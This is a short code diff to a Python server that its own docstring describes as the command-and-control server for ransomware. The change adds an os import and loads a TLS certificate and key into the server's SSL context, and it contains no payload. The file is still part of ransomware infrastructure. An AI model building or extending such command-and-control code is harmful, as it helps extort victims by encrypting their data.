@@ -2,6 +2,7 @@
 C&C server for communication with the ransomware on local machine
 """
 import socket, select
+import os
 import sys
 import ssl
 from threading import Thread
@@ -51,6 +52,7 @@ class Server():
         Mainly socket setup in the initialzer
         """
         self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        self.context.load_cert_chain("cnc/cert.pem", "cnc/key.pem")
 
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
